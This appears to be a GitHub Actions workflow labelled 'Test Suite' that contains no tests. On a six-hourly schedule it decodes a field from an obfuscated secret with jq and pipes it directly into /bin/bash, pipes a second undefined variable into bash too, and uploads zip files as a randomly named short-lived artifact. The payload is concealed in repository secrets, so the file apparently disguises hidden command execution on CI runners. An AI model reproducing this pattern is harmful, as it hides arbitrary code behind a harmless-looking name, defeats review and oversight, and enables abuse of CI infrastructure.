name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '54 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Invoke
        env:
          w296: ${{ secrets.w296 }}
        run: |
          printf '%s' "$w296" | jq -r .pexd98 | /bin/bash
          echo $nney51 | jq -r .pbqc7 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: GnueGmPm
          path: "*.zip"
          retention-days: 1
